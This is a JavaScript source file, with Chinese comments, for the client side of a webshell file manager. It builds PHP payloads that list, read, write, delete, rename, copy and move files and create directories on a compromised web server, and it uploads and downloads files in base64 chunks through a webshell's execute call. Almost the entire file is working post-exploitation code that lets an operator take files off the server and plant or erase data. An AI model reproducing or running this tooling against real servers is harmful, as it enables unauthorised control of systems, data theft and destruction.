/**
 * Webshell 文件管理模块
 * 异步文件上传下载、文件操作
 */

const WebshellFileManager = (function() {
    // 文件系统状态
    let currentPath = '/';
    let fileList = [];
    let clipboard = {
        type: null, // 'copy' or 'cut'
        files: []
    };

    // 文件类型图标映射
    const FILE_ICONS = {
        'folder': '📁',
        'file': '📄',
        'php': '🐘',
        'html': '🌐',
        'css': '🎨',
        'js': '📜',
        'json': '📋',
        'txt': '📝',
        'md': '📖',
        'jpg': '🖼️',
        'jpeg': '🖼️',
        'png': '🖼️',
        'gif': '🖼️',
        'zip': '📦',
        'rar': '📦',
        'tar': '📦',
        'gz': '📦',
        'sql': '🗃️',
        'sh': '💻',
        'py': '🐍',
        'rb': '💎',
        'java': '☕',
        'class': '☕',
        'jar': '☕',
        'xml': '📋',
        'yml': '📋',
        'yaml': '📋',
        'conf': '⚙️',
        'log': '📊',
        'pdf': '📕',
        'doc': '📘',
        'docx': '📘',
        'xls': '📗',
        'xlsx': '📗',
        'ppt': '📙',
        'pptx': '📙',
        'mp3': '🎵',
        'mp4': '🎬',
        'avi': '🎬',
        'mkv': '🎬'
    };

    // 获取文件图标
    function getFileIcon(filename, isDir = false) {
        if (isDir) return FILE_ICONS.folder;

        const ext = filename.split('.').pop().toLowerCase();
        return FILE_ICONS[ext] || FILE_ICONS.file;
    }

    // 格式化文件大小
    function formatFileSize(bytes) {
        if (bytes === 0) return '0 B';
        const k = 1024;
        const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }

    // 格式化时间戳
    function formatTimestamp(timestamp) {
        const date = new Date(timestamp * 1000);
        return date.toLocaleString('zh-CN', {
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit'
        });
    }

    // 格式化权限
    function formatPermission(perm) {
        if (typeof perm === 'string') {
            // 如果已经是 rwx 格式
            if (perm.includes('r') || perm.includes('w') || perm.includes('x')) {
                return perm;
            }
            // 数字权限转 rwx
            const num = parseInt(perm, 8);
            const rwx = (n, shift) => ['r', 'w', 'x']
                .map((c, i) => (n >> (shift + 2 - i)) & 1 ? c : '-')
                .join('');
            return (num & 0o400 ? 'r' : '-') + (num & 0o200 ? 'w' : '-') + (num & 0o100 ? 'x' : '-') +
                   (num & 0o040 ? 'r' : '-') + (num & 0o020 ? 'w' : '-') + (num & 0o010 ? 'x' : '-') +
                   (num & 0o004 ? 'r' : '-') + (num & 0o002 ? 'w' : '-') + (num & 0o001 ? 'x' : '-');
        }
        return perm;
    }

    // 构建列表目录 Payload
    function buildListDirPayload(path) {
        return `
            $dir = '${path}';
            $result = array();
            if (is_dir($dir)) {
                if ($dh = opendir($dir)) {
                    while (($file = readdir($dh)) !== false) {
                        if ($file == '.' || $file == '..') continue;
                        $filepath = $dir . '/' . $file;
                        $result[] = array(
                            'name' => $file,
                            'type' => is_dir($filepath) ? 'dir' : 'file',
                            'size' => filesize($filepath),
                            'mtime' => filemtime($filepath),
                            'perm' => substr(sprintf('%o', fileperms($filepath)), -4)
                        );
                    }
                    closedir($dh);
                }
            }
            echo json_encode($result);
        `;
    }

    // 构建读取文件 Payload
    function buildReadFilePayload(path) {
        return `
            $file = '${path}';
            if (file_exists($file) && is_file($file)) {
                header('Content-Type: application/octet-stream');
                header('Content-Length: ' . filesize($file));
                readfile($file);
            } else {
                echo 'ERROR: File not found';
            }
        `;
    }

    // 构建写入文件 Payload
    function buildWriteFilePayload(path, content, isBase64 = true) {
        if (isBase64) {
            return `
                $file = '${path}';
                $content = base64_decode('${content}');
                $result = file_put_contents($file, $content);
                echo $result !== false ? 'OK' : 'ERROR';
            `;
        }
        return `
            $file = '${path}';
            $result = file_put_contents($file, '${content.replace(/'/g, "\\'")}');
            echo $result !== false ? 'OK' : 'ERROR';
        `;
    }

    // 构建删除文件 Payload
    function buildDeletePayload(path) {
        return `
            $path = '${path}';
            if (is_file($path)) {
                echo unlink($path) ? 'OK' : 'ERROR';
            } elseif (is_dir($path)) {
                function rrmdir($dir) {
                    if (is_dir($dir)) {
                        $objects = scandir($dir);
                        foreach ($objects as $object) {
                            if ($object != "." && $object != "..") {
                                if (is_dir($dir."/".$object))
                                    rrmdir($dir."/".$object);
                                else
                                    unlink($dir."/".$object);
                            }
                        }
                        rmdir($dir);
                    }
                }
                rrmdir($path);
                echo 'OK';
            } else {
                echo 'ERROR: Not found';
            }
        `;
    }

    // 构建重命名 Payload
    function buildRenamePayload(oldPath, newPath) {
        return `
            $old = '${oldPath}';
            $new = '${newPath}';
            echo rename($old, $new) ? 'OK' : 'ERROR';
        `;
    }

    // 构建复制 Payload
    function buildCopyPayload(src, dst) {
        return `
            $src = '${src}';
            $dst = '${dst}';
            echo copy($src, $dst) ? 'OK' : 'ERROR';
        `;
    }

    // 构建移动 Payload
    function buildMovePayload(src, dst) {
        return `
            $src = '${src}';
            $dst = '${dst}';
            echo rename($src, $dst) ? 'OK' : 'ERROR';
        `;
    }

    // 构建创建目录 Payload
    function buildMkdirPayload(path) {
        return `
            $dir = '${path}';
            echo mkdir($dir, 0755, true) ? 'OK' : 'ERROR';
        `;
    }

    // 构建获取文件信息 Payload
    function buildStatPayload(path) {
        return `
            $file = '${path}';
            if (file_exists($file)) {
                $stat = stat($file);
                echo json_encode(array(
                    'size' => $stat['size'],
                    'mtime' => $stat['mtime'],
                    'atime' => $stat['atime'],
                    'ctime' => $stat['ctime'],
                    'perm' => substr(sprintf('%o', fileperms($file)), -4),
                    'type' => is_dir($file) ? 'dir' : 'file',
                    'readable' => is_readable($file),
                    'writable' => is_writable($file)
                ));
            } else {
                echo 'ERROR: File not found';
            }
        `;
    }

    // 解析文件列表响应
    function parseFileListResponse(response) {
        try {
            // 可能已经是数组（被parseResponse解析过）
            let files;
            if (Array.isArray(response)) {
                files = response;
            } else if (typeof response === 'string') {
                files = JSON.parse(response);
            } else {
                return [];
            }

            return files.map(f => ({
                name: f.name,
                type: f.type || 'file',
                size: parseInt(f.size) || 0,
                mtime: parseInt(f.mtime) || 0,
                perm: f.perm || '0644',
                icon: getFileIcon(f.name, f.type === 'dir' || f.type === 'directory')
            }));
        } catch (e) {
            console.error('parseFileListResponse error:', e, response);
            return [];
        }
    }

    // 分块上传文件
    async function uploadFileChunked(file, remotePath, webshell, onProgress) {
        const chunkSize = 1024 * 1024; // 1MB per chunk
        const totalChunks = Math.ceil(file.size / chunkSize);
        const fileId = Date.now().toString(36);

        for (let i = 0; i < totalChunks; i++) {
            const start = i * chunkSize;
            const end = Math.min(start + chunkSize, file.size);
            const chunk = file.slice(start, end);

            const reader = new FileReader();
            const chunkData = await new Promise((resolve, reject) => {
                reader.onload = () => {
                    const base64 = btoa(
                        new Uint8Array(reader.result)
                            .reduce((data, byte) => data + String.fromCharCode(byte), '')
                    );
                    resolve(base64);
                };
                reader.onerror = reject;
                reader.readAsArrayBuffer(chunk);
            });

            // 构建分块上传 payload
            const payload = `
                $file = '${remotePath}';
                $chunk = base64_decode('${chunkData}');
                $fp = fopen($file, ${i === 0 ? "'wb'" : "'ab'"});
                fwrite($fp, $chunk);
                fclose($fp);
                echo 'OK';
            `;

            await webshell.execute(payload);

            if (onProgress) {
                onProgress({
                    chunk: i + 1,
                    total: totalChunks,
                    percent: Math.round(((i + 1) / totalChunks) * 100)
                });
            }
        }

        return { success: true, path: remotePath };
    }

    // 下载文件 (分块)
    async function downloadFileChunked(remotePath, webshell, onProgress) {
        // 先获取文件大小
        const statPayload = buildStatPayload(remotePath);
        const statResult = await webshell.execute(statPayload);
        const stat = JSON.parse(statResult);
        const fileSize = stat.size;
        const fileName = remotePath.split('/').pop();

        // 读取完整文件
        const readPayload = `
            $file = '${remotePath}';
            $content = file_get_contents($file);
            echo base64_encode($content);
        `;

        const base64Content = await webshell.execute(readPayload);

        // 转换为 Blob 并下载
        const binaryString = atob(base64Content);
        const bytes = new Uint8Array(binaryString.length);
        for (let i = 0; i < binaryString.length; i++) {
            bytes[i] = binaryString.charCodeAt(i);
        }

        const blob = new Blob([bytes]);
        const url = URL.createObjectURL(blob);

        const a = document.createElement('a');
        a.href = url;
        a.download = fileName;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);

        return { success: true };
    }

    // 公开 API
    return {
        getFileIcon,
        formatFileSize,
        formatTimestamp,
        formatPermission,
        buildListDirPayload,
        buildReadFilePayload,
        buildWriteFilePayload,
        buildDeletePayload,
        buildRenamePayload,
        buildCopyPayload,
        buildMovePayload,
        buildMkdirPayload,
        buildStatPayload,
        parseFileListResponse,
        uploadFileChunked,
        downloadFileChunked,
        getCurrentPath: () => currentPath,
        setCurrentPath: (path) => { currentPath = path; },
        getFileList: () => fileList,
        setFileList: (list) => { fileList = list; }
    };
})();

// 导出模块
if (typeof module !== 'undefined' && module.exports) {
    module.exports = WebshellFileManager;
}
